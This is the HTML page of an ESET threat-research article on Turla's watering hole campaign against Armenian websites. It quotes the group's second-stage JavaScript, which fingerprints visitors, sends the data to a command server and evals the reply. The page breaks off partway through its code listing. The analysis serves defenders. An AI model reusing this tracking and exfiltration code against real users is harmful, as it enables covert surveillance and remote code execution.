<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Matthieu Faou',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity</title>
<meta name="description" content="ESET researchers have found that a watering hole operation, conducted by the Turla APT group, compromised several high-profile Armenian websites to enable the distribution of two previously undocumented pieces of malware."/>
<link rel="canonical" href="https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers have found that a watering hole operation, conducted by the Turla APT group, compromised several high-profile Armenian websites to enable the distribution of two previously undocumented pieces of malware." />
<meta property="og:url" content="https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2020-03-12T10:30:45+00:00" />
<meta property="article:modified_time" content="2020-03-12T14:22:10+00:00" />
<meta property="og:updated_time" content="2020-03-12T14:22:10+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/03/Tracking-Turla-New-backdoor-delivered-via-Armenian-watering-holes.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2020/03/Tracking-Turla-New-backdoor-delivered-via-Armenian-watering-holes.jpg" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="768" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers have found that a watering hole operation, conducted by the Turla APT group, compromised several high-profile Armenian websites to enable the distribution of two previously undocumented pieces of malware." />
<meta name="twitter:title" content="Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/03/Tracking-Turla-New-backdoor-delivered-via-Armenian-watering-holes.jpg" />
<meta name="twitter:creator" content="@matthieu_faou" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2020/03/23/novo-backdoor-do-grupo-turla-e-propagado-atraves-de-atualizacao-falsa-do-adobe-flash/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2020/03/12/turla-backdoor-trou-eau-armenien/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2020/03/12/nuevo-backdoor-de-turla-distribuido-mediante-watering-hole/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2020/03/12/turla-watering-hole-attack-armenien/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2020/03/23/novo-backdoor-do-grupo-turla-e-propagado-atraves-de-atualizacao-falsa-do-adobe-flash/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2020/03/12/turla-backdoor-trou-eau-armenien/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/03/12/nuevo-backdoor-de-turla-distribuido-mediante-watering-hole/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/03/12/turla-watering-hole-attack-armenien/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2020/03/23/novo-backdoor-do-grupo-turla-e-propagado-atraves-de-atualizacao-falsa-do-adobe-flash/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2020/03/12/turla-backdoor-trou-eau-armenien/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/03/12/nuevo-backdoor-de-turla-distribuido-mediante-watering-hole/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/03/12/turla-watering-hole-attack-armenien/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2020/03/turla-armenian-websites-watering-holes.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>Tracking Turla: New backdoor delivered via Armenian watering holes</h1>
<div class="excerpt">Can an old APT learn new tricks? Turla’s TTPs are largely unchanged, but the group recently added a Python backdoor.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2021/02/Matthieu-Faou-222x179.jpg" alt="Matthieu Faou">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2020-03-12 11:30:45">12 Mar 2020 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F12%2Ftracking-turla-new-backdoor-armenian-watering-holes%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F12%2Ftracking-turla-new-backdoor-armenian-watering-holes%2F&text=Tracking Turla: New backdoor delivered via Armenian watering holes%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F12%2Ftracking-turla-new-backdoor-armenian-watering-holes%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>Can an old APT learn new tricks? Turla’s TTPs are largely unchanged, but the group recently added a Python backdoor.</p>
                            </div>

                            <p>ESET researchers found a watering hole (aka strategic web compromise) operation targeting several high-profile Armenian websites. It relies on a fake Adobe Flash update lure and delivers two previously undocumented pieces of malware we have dubbed NetFlash and PyFlash.</p>
<p>Various aspects of this campaign lead us to attribute this operation to Turla, an infamous espionage group active for more than ten years. Its main targets include governmental and military organizations. We have previously reported multiple campaigns of this group including <a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf" target="_blank" rel="noopener">Mosquito</a> and <a href="https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf" target="_blank" rel="noopener">LightNeuron</a>.</p>
<p>This recent operation bears similarities to several of Turla’s watering hole campaigns that we have tracked in the past years. In particular, the modus operandi is similar to a <a href="https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/" target="_blank" rel="noopener">campaign</a> we uncovered in 2017. The various pieces of JavaScript used there are almost identical to those in this campaign, but the targets and payloads are different.</p>
<h2>Targeted websites</h2>
<p>In this specific operation, Turla has compromised at least four Armenian websites, including two belonging to the government. Thus, it is likely the targets include government officials and politicians.</p>
<p>According to ESET telemetry, the following websites were compromised:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">armconsul[.]ru</span>: The consular Section of the Embassy of Armenia in Russia</li>
<li><span style="font-family: courier new, courier, monospace;">mnp.nkr[.]am</span>: Ministry of Nature Protection and Natural Resources of the Republic of Artsakh</li>
<li><span style="font-family: courier new, courier, monospace;">aiisa[.]am</span>: The Armenian Institute of International and Security Affairs</li>
<li><span style="font-family: courier new, courier, monospace;">adgf[.]am</span>: The Armenian Deposit Guarantee Fund</li>
</ul>
<p>We have indications that these websites were compromised since at least the beginning of 2019. We notified the Armenian national CERT and shared our analysis with them before publication.</p>
<p>Turla operators leveraged unknown access methods to these websites to insert a piece of malicious JavaScript code. For example, for <span style="font-family: courier new, courier, monospace;">mnp.nkr[.]am</span>, they appended obfuscated code at the end of <span style="font-family: courier new, courier, monospace;">jquery-migrate.min.js</span> (a common JavaScript library), as shown in Figure 1.</p>
<div id="attachment_135902" style="width: 709px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-1.png"><img class="wp-image-135902" src="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-1-300x87.png" alt="" width="699" height="203" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-1-300x87.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-1-768x223.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-1-1024x297.png 1024w" sizes="(max-width: 699px) 100vw, 699px" /></a><p class="wp-caption-text"><i>Figure 1. Obfuscated JavaScript code injected into the mnp.nkr[.]am website</i></p></div>
<p>This code loads an external JavaScript from <span style="font-family: courier new, courier, monospace;">skategirlchina[.]com/wp-includes/data_from_db_top.php</span>. We analyze this code in the next section.</p>
<p>Since the end of November 2019, we noticed that <span style="font-family: courier new, courier, monospace;">skategirlchina[.]com</span> was not delivering malicious scripts anymore. Thus, it is likely the Turla operators have suspended this watering hole operation.</p>
<h2>Fingerprinting and malware delivery</h2>
<p>Upon visiting a compromised webpage, the second-stage malicious JavaScript is delivered by <span style="font-family: courier new, courier, monospace;">skategirlchina[.]com</span> and fingerprints the visitor’s browser. Figure 2 shows the main function of this script.</p>
<p>If it is the first time the user’s browser executes the script, it will add an <a href="https://en.wikipedia.org/wiki/Evercookie" target="_blank" rel="noopener"><em>evercookie</em></a> with a seemingly random MD5 value provided by the server, different at each execution of the script. The implementation of the evercookie is based on code available on <a href="https://github.com/samyk/evercookie" target="_blank" rel="noopener">GitHub</a>. It uses multiple storage places such as the local database, local shared objects (Flash cookies), Silverlight storage, etc., to store the cookie value. In comparison to a regular cookie, it will be much more persistent as it won’t be deleted if the user just deletes the browser’s cookies.</p>
<p>This evercookie will be used to track whether the user visits one of the compromised websites again. When the user comes back for a second time, the previously stored MD5 value will be used to identify them.</p>
<p>Then, it collects several pieces of information including the browser plugin list, the screen resolution and various operating system information. This is sent to the C&amp;C server in a <span style="font-family: courier new, courier, monospace;">POST</span> request. If there is a reply, it is assumed to be JavaScript code and is executed using the <span style="font-family: courier new, courier, monospace;">eval</span> function.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581be401607363992723" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[…]
function f_ec(){
    var ec = new evercookie({domain:'http://skategirlchina[.]com/wp-includes/data_from_db_top.php',baseurl:'?http://skategirlchina[.]com/wp-includes/data_from_db_top.php'});
    ec.get("ec", function(value) {
        if (value!=undefined){
            var jsonText = {'ec': ''+value+'',
                            'scp':screen.pixelDepth==undefined?''+0+'':''+screen.pixelDepth+'',
                            'scw':''+screen.width+'',
                            'sch':''+screen.height+'',
                            'bn':''+bn+'',
                            'bv':''+bv+'',
                            'bc':''+bc+'',
                            'osn':''+osn+'',
                            'osv':''+osv+'',
                            'osc':''+osc+'',
                            'adr':''+adr+'',
                            'pdr':''+pdr+'',
                            'fla':''+fla+'',
                            'jav':''+jav+'',
                            'wmp':''+wmp+'',
                            'msw':''+msw+'',
                            'qui':''+qui+'',
                            'sho':''+sho+'',
                             'type':'info',
                            'tiz': ''+(new Date().getTimezoneOffset()/60)+''
                            };
                var json = JSON.stringify(jsonText);

                 ajax({
                content_type : 'application/json',
                url:  'http://skategirlchina[.]com/wp-includes/data_from_db_top.php?http://skategirlchina[.]com/wp-includes/data_from_db_top.php',
                crossDomain: true,
                type: 'POST',
                data: json,
                onSuccess: function(m){
                    eval(m);
                }
            });
        }
        else{
           ec.set('ec', '&lt;redacted MD5 value&gt;');
           setTimeout(f_ec,1500);
        }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581be401607363992723-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-2">2</div><div class="crayon-num" data-line="crayon-60581be401607363992723-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-4">4</div><div class="crayon-num" data-line="crayon-60581be401607363992723-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-6">6</div><div class="crayon-num" data-line="crayon-60581be401607363992723-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-8">8</div><div class="crayon-num" data-line="crayon-60581be401607363992723-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-10">10</div><div class="crayon-num" data-line="crayon-60581be401607363992723-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-12">12</div><div class="crayon-num" data-line="crayon-60581be401607363992723-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-14">14</div><div class="crayon-num" data-line="crayon-60581be401607363992723-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-16">16</div><div class="crayon-num" data-line="crayon-60581be401607363992723-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-18">18</div><div class="crayon-num" data-line="crayon-60581be401607363992723-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-20">20</div><div class="crayon-num" data-line="crayon-60581be401607363992723-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-22">22</div><div class="crayon-num" data-line="crayon-60581be401607363992723-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-24">24</div><div class="crayon-num" data-line="crayon-60581be401607363992723-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-26">26</div><div class="crayon-num" data-line="crayon-60581be401607363992723-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-28">28</div><div class="crayon-num" data-line="crayon-60581be401607363992723-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-30">30</div><div class="crayon-num" data-line="crayon-60581be401607363992723-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-32">32</div><div class="crayon-num" data-line="crayon-60581be401607363992723-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-34">34</div><div class="crayon-num" data-line="crayon-60581be401607363992723-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-36">36</div><div class="crayon-num" data-line="crayon-60581be401607363992723-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-38">38</div><div class="crayon-num" data-line="crayon-60581be401607363992723-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-40">40</div><div class="crayon-num" data-line="crayon-60581be401607363992723-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be401607363992723-42">42</div><div class="crayon-num" data-line="crayon-60581be401607363992723-43">43</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581be401607363992723-1"><span class="crayon-sy">[</span>…<span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">f_ec</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581be401607363992723-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">ec</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">evercookie</span><span class="crayon-sy">(</span><span class="crayon-sy">{</span><span class="crayon-v">domain</span><span class="crayon-o">:</span><span class="crayon-s">'http://skategirlchina[.]com/wp-includes/data_from_db_top.php'</span><span class="crayon-sy">,</span><span class="crayon-v">baseurl</span><span class="crayon-o">:</span><span class="crayon-s">'?http://skategirlchina[.]com/wp-includes/data_from_db_top.php'</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">ec</span><span class="crayon-sy">.</span><span class="crayon-e">get</span><span class="crayon-sy">(</span><span class="crayon-s">"ec"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-v">value</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581be401607363992723-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">value</span><span class="crayon-o">!=</span><span class="crayon-v">undefined</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">jsonText</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-s">'ec'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span 